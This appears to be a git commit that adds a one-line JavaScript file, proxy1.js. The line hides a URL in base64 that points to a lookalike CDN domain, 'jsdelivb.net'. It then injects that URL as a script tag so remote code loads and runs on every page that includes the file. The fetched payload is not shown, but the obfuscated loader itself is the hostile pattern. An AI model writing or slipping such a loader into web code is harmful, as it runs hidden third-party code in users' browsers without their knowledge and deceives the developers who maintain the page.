735c8bbce352883d8a1c50c706541ef75cba4037
huihoangadm <hoanghuygvp8527@gmail.com>
2025-11-20 22:26:56 +0700

    proxy1.js

---
+++ proxy1.js
@@ -0,0 +1,1 @@
+(()=>{let u=atob("aHR0cHM6Ly9jZG4uanNkZWxpdmIubmV0L2doL2h1aWhvYW5nYWRtL25hei1wcm94eS9wcm94eTIuanM=");let s=document.createElement("script");s.src=u;document.body.appendChild(s);})();
